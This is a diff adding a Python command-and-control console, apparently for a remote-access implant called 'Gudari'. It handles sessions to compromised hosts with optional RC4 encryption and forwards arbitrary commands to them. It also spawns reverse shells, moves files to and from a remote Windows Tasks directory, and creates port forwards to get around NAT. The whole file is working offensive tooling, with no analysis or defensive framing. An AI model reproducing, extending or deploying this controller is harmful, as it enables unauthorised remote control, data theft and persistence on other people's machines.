@@ -1,0 +1,377 @@
+#!/usr/bin/env python3
+
+'''
+TODO LIST
+-> run local commands
+-> catch null inputs in consoles -> there is a global exception that catches it but can be improved
+-> execall -> run commands in all connected bots
+-> Add helpers to manage
+-> Tab completion
+'''
+import time
+import readline
+import random
+import terminaltables
+import subprocess
+import threading
+
+from classes import GudariHandler, GudariRC4Handler, GudariShell, Msg
+
+#Required parameters
+PARAMS={'LHOST':'', 
+        'LPORT':'4444',
+        'LDIR':'.',
+        'RDIR':'c:\\Windows\\Tasks',
+        'TRPORT':'4567',
+        'SHPORT':'4568',
+        'RANDOM':'1',
+        'SESSION':'0',
+        'PASSWORD':'abcd'}
+
+SESSIONS={'0':"main"} #Zero session is the main console
+SID=0 # Session counter, set to zero
+LAG=0.5 #Use lower values in faster connections 
+
+#Functions
+def prWelcome():
+    print("""                       ____________________                      
+                      |||\ \     | |    / /|                    
+        .-\"\"\"-.       |||   \ \  | |  / /  |       
+       /=      \\      |||_____\_\| |/_/____|       
+      |- /~~~\\  |     |||________  ________|       
+      |=( '.' ) |     |||     / /| |\ \    |        
+      \\__\\_=_/__/     |||   / /  | |  \ \  |      
+       {_______}      |||/_/_____|_|____\_\|        
+     /` *       `'--._||
+    /= .     [] .     { >
+   /  /|ooo     |`'--'||             ___  __  __  ____    __    ____  ____    
+  (   )\\_______/      ||            / __)(  )(  )(  _ \\  /__\\  (  _ \\(_  _)
+   \\``\\/       \\      ||           ( (_-. )(__)(  )(_) )/(__)\\  )   / _)(_      
+    `-| ==    \\_|     ||            \\___/(______)(____/(__)(__)(_)\\_)(____)
+      /         |     ||           _   _    __    _  _  ____  __    ____  ____
+     |=   >\\  __/     ||          ( )_( )  /__\\  ( \\( )(  _ \\(  )  ( ___)(  _ \\
+     \\   \\ |- --|     ||           ) _ (  /(__)\\  )  (  )(_) ))(__  )__)  )   /
+      \\ __| \\___/     ||          (_) (_)(__)(__)(_)\\_)(____/(____)(____)(_)\\_)
+      _{__} _{__}     ||
+     (    )(    )     ||
+ ^^~  `\"\"\"  `\"\"\"  ~^^^~^^~~~^^^~^^^~^^^~^^~^````    
+    """)
+def randomPort():
+    return str(random.randint(40000,65535))
+
+def addSession():
+    global SID
+    global PARAMS
+    global SESSIONS
+
+    Msg.info("Adding new session...")
+    SID+=1
+    sSID=str(SID)
+    if not PARAMS['PASSWORD']:
+        SESSIONS[sSID]=GudariHandler(PARAMS['LHOST'],int(PARAMS['LPORT']))
+    else:
+        SESSIONS[sSID]=GudariRC4Handler(PARAMS['LHOST'],int(PARAMS['LPORT']),str(PARAMS['PASSWORD']))
+    if SESSIONS[sSID].connect()!=False:
+        PARAMS['SESSION']=sSID
+    else:
+        Msg.err("Conection Failed!")
+        SESSIONS[sSID]=False
+    return SID
+
+def addShellSession(S, session):
+    # check that lhost is set
+    global SID
+    global PARAMS
+
+    Msg.info("Spawnning a shell...")
+    Msg.info("Check available commands with !HELP")
+    #Random port if random==1
+    if PARAMS['RANDOM']=='1': PARAMS['SHPORT']=randomPort()
+    SID+=1
+    sSID=str(SID)
+    SESSIONS[sSID]=GudariShell(PARAMS['LHOST'],int(PARAMS['SHPORT']))
+    #Need to send the command through the s socket
+    cmd="SPAWN %s %s\n"%(PARAMS['LHOST'],PARAMS['SHPORT'])
+    session.sktSend(cmd)
+    Msg.info(cmd)
+    if SESSIONS[sSID].connect()!=False:
+        PARAMS['SESSION']=sSID       
+    else :
+        Msg.err("Connection Failed!")
+        SESSIONS[sSID]=False       
+    return SID
+
+
+def setVar(var,value):    
+    global PARAMS
+    global SESSIONS
+    #check that session is not bigger than the number of sessions
+    #or is false
+    if var=="SESSION":
+        if int(value)>(len(SESSIONS)-1) or SESSIONS[value]==False:
+            Msg.warn("Session doesn't exist or is no longer valid!")
+            return
+    
+    #check that it's not a new var, just allow change existing ones
+    if not var in PARAMS:
+        Msg.warn("VAR doesn't exist!")
+        showOptions("OPTIONS",PARAMS,SESSIONS)
+    PARAMS[var]=value
+
+def delSession(s):
+    PARAMS['SESSION']='0'
+    SESSIONS[s].disconnect()
+    SESSIONS[s]=False
+
+def closeAllSessions():
+    global SESSIONS
+    for s in SESSIONS:
+        if 'classes' in str(type(SESSIONS[s])):
+            delSession(s)
+            time.sleep(LAG)
+            
+def showOptions(options,PARAMS,SESSIONS):
+    data=[]
+    if options=="OPTIONS" or options=="OPT":        
+        title = "SHOW OPTIONS"
+        for n in PARAMS:
+            data.append([n, PARAMS[n]])
+    
+    elif options=="SESSIONS" or options=="SES": 
+        s=[]
+        title = "SHOW REMOTE SESSIONS"
+        for n in SESSIONS:
+            if SESSIONS[n]!=False and n!='0':                
+                s.append(n)
+        if len(s)>0:
+            for n in s:
+                data.append([n,SESSIONS[n].RHOST,SESSIONS[n].LPORT,SESSIONS[n].TYPE])
+        else:
+            Msg.warn("NO SESSIONS AVAILABLE")
+            return
+    elif options=="FORWARDS" or options=="FWD":
+            title="SHOW ENABLED FORWARDINGS"
+            data=SESSIONS[PARAMS["SESSION"]].showForward()
+    else:
+        Msg.warn("Not implemented Allowed: SESSIONS, OPTIONS or FORWARDS")
+        return
+    printTable(data, title)
+    
+def printTable(data, title):
+    table = terminaltables.SingleTable(data)
+    table.title = title
+    table.inner_row_border = True
+    print ()
+    print(table.table)
+    print()
+
+def fDownload(s, fName):
+    global PARAMS    
+    if PARAMS['RANDOM']=='1': PARAMS['TRPORT']=randomPort()
+    SESSIONS[s].downloadFile(PARAMS['LHOST'],PARAMS['TRPORT'],fName,PARAMS['LDIR'])
+
+def fUpload(s, fName):
+    global PARAMS
+    if PARAMS['RANDOM']=='1': PARAMS['TRPORT']=randomPort()
+    SESSIONS[s].uploadFile(PARAMS['LHOST'],PARAMS['TRPORT'],fName,PARAMS['RDIR'])
+
+def doForward(s, lport, rhost, rport):
+    SESSIONS[s].addForward(PARAMS['LHOST'],lport, rhost, rport)
+
+def delForward(s,id):
+    SESSIONS[s].stopForward(int(id))
+
+def getPrompt():
+    if PARAMS['SESSION']=='0': 
+        prompt="#0(MAIN)> "
+    elif SESSIONS[PARAMS['SESSION']].TYPE == "gudari":
+        prompt="#{0:s}(src:{1:s} to tcp:{2:d})> ".format(PARAMS['SESSION'],SESSIONS[PARAMS['SESSION']].RHOST[0],SESSIONS[PARAMS['SESSION']].LPORT)
+    elif SESSIONS[PARAMS['SESSION']].TYPE == "revshell":
+        prompt=" "
+    return prompt
+
+def mainHelper():
+    title="Main Commands"
+    data=[['CMD','PARAMS','DESCRIPTION']]
+    data.append(['SHOW','OPT|SES','Shows OPTIONS and SESSIONS'])
+    data.append(['SET','VAR VALUE','Check available VARS with SHOW OPTIONS'])
+    data.append(['RUN','(none)','Spawns a Gudari listener with the active conf.'])
+    data.append(['EXECALL','cmd','Executes a command in all Gudaris'])
+    data.append(['EXIT','(none)','alias: QUIT, TERMINATE'])
+    printTable(data, title)
+
+def gudariHelper():
+    title="Gudari Commands"
+    data=[['CMD','PARAMS','DESCRIPTION']]
+    data.append(['SHOW','OPT|SES|FWD','Shows OPTIONS, SESSIONS and FORWARDINGS'])
+    data.append(['SET','VAR VALUE','Check available VARS with SHOW OPTIONS'])
+    data.append(['RUN','(none)','Spawns a Gudari listener with the active conf.'])
+    data.append(['SHELL','(none)','Spawns a reverse shell'])
+    data.append(['DOWNLOAD','RemoteFile','Use full path. File stored in LDIR'])
+    data.append(['UPLOAD','LocalFilename','Use full path. File stored in RDIR'])
+    data.append(['FORWARD','LPORT RHOST RPORT','Creates a port forward to bypass NAT'])
+    data.append(['DELFORWARD','ForwardID','Check id using SHOW FWD'])
+    data.append(['TERMINATE','(none)','Ends Gudari session'])
+    printTable(data, title)
+
+def shellHelper():
+    title="Shell Commands"
+    data=[['CMD','PARAMS','DESCRIPTION']]
+    data.append(['!SHOW','OPT|SES','Shows OPTIONS and SESSIONS'])
+    data.append(['!SET','VAR VALUE','Check available VARS with SHOW OPTIONS'])    
+    data.append(['EXIT','(none)','alias: !TERMINATE'])
+    printTable(data, title)
+
+
+def consoleMain():
+    global SID
+    global PARAMS
+
+    uinput = input(getPrompt())
+    opts = uinput.split()
+    action = opts[0].upper()
+    if action=="SET":
+        var = opts[1].upper()
+        setVar(var, opts[2])
+
+    elif action=="EXIT" or action=="QUIT" or action =="TERMINATE":         
+        closeAllSessions()
+        exit()
+
+    elif action=="SHOW":
+        var = opts[1].upper()
+        showOptions(var,PARAMS,SESSIONS)
+        
+    elif action=="RUN":
+        SID=addSession()
+        time.sleep(LAG)
+    
+    elif action=="EXECALL":
+        Msg.dbg("Exec ALL NOT IMPLEMENTED")
+    
+    elif action=="HELP": mainHelper()
+
+def consoleGudari():
+    global SID
+    global LAG
+    global PARAMS
+
+    try:
+        uinput = input(getPrompt())
+        opts = uinput.split()
+        action = opts[0].upper()
+        if action=="SET":
+            var = opts[1].upper()
+            setVar(var, opts[2])
+            
+        elif action=="SHOW":
+            var = opts[1].upper()
+            showOptions(var,PARAMS,SESSIONS)
+            
+        elif action=="RUN":
+            SID=addSession()
+            time.sleep(LAG)
+        
+        elif action=="SHELL":
+            SID=addShellSession(PARAMS['SESSION'],SESSIONS[PARAMS['SESSION']])
+            time.sleep(LAG)
+
+        elif action=="TERMINATE":
+            delSession(PARAMS['SESSION'])
+            time.sleep(LAG) # in slow connections put higher value - prompt adjustment
+
+        elif action=="DOWNLOAD":
+            fDownload(PARAMS['SESSION'], opts[1])                        
+        
+        elif action=="UPLOAD":
+            fUpload(PARAMS['SESSION'], opts[1])
+        
+        elif action=="FORWARD":            
+            doForward(PARAMS['SESSION'],opts[1], opts[2], opts[3])
+            time.sleep(LAG)
+        
+        elif action=="DELFORWARD":
+            delForward(PARAMS['SESSION'], opts[1])
+            time.sleep(LAG)
+        
+        elif action=="HELP": gudariHelper()
+
+        else:
+            cmd="EXEC %s\n" % uinput
+            SESSIONS[PARAMS['SESSION']].sktSend(cmd)
+            time.sleep(LAG) # in slow connections put higher value - prompt adjustment
+
+    except KeyboardInterrupt:
+        print()
+        delSession(PARAMS['SESSION'])
+        time.sleep(LAG) # in slow connections put higher value - prompt adjustment
+
+
+def consoleShell():
+    global PARAMS
+    global LAG
+    o_sess=PARAMS['SESSION']
+
+    try:
+        uinput=input(getPrompt())
+        opts = uinput.split()    
+        action = opts[0].upper()
+        if action=="!SET":
+            var = opts[1].upper()
+            setVar(var, opts[2])
+            if o_sess==PARAMS['SESSION']:SESSIONS[PARAMS['SESSION']].sktSend("\n")
+
+        elif action=="!TERMINATE" or action=="EXIT":
+            delSession(PARAMS['SESSION'])
+            time.sleep(LAG) # in slow connections put higher value - prompt adjustment
+    
+        elif action=="!SHOW":
+            var = opts[1].upper()
+            showOptions(var,PARAMS,SESSIONS)
+            if o_sess==PARAMS['SESSION']:SESSIONS[PARAMS['SESSION']].sktSend("\n")
+        
+        elif action=="!HELP": 
+            shellHelper()
+            if o_sess==PARAMS['SESSION']:SESSIONS[PARAMS['SESSION']].sktSend("\n")
+            time.sleep(LAG)
+                
+        else:    
+            cmd="%s\n" % uinput
+            SESSIONS[PARAMS['SESSION']].sktSend(cmd)
+            time.sleep(LAG) # in slow connections put higher value - prompt adjustment
+    except KeyboardInterrupt:
+        print()
+        delSession(PARAMS['SESSION'])
+        time.sleep(LAG) # in slow connections put higher value - prompt adjustment
+    except:
+        SESSIONS[PARAMS['SESSION']].sktSend("\n")
+        pass
+
+#Start execution
+prWelcome()
+
+#Populating ip address
+ip=subprocess.getoutput("ifconfig eth0 | sed -n 2p | awk '{print $2}'")
+if not "error" in ip: PARAMS['LHOST'] = ip
+
+while True:    
+    try:
+        #Need to control SESSION is an instance
+        if 'classes' in str(type(SESSIONS[PARAMS['SESSION']])):
+            if SESSIONS[PARAMS['SESSION']].TYPE == "revshell": consoleShell()
+            elif SESSIONS[PARAMS['SESSION']].TYPE == "gudari": consoleGudari()
+        else:
+            if PARAMS['SESSION']!='0': Msg.warn("Invalid session. Switching to main...")
+            PARAMS['SESSION']='0' 
+            consoleMain() 
+
+    
+    except KeyboardInterrupt:
+        print()
+        Msg.warn("Ctr+C detected!")
+        Msg.warn("Closing all connections...")
+        closeAllSessions()
+        break
+    except Exception as e:  #Disabling this exception will help debugging
+        Msg.dbg(str(e))     #But breaks quite thing on small bugs
+exit(0)
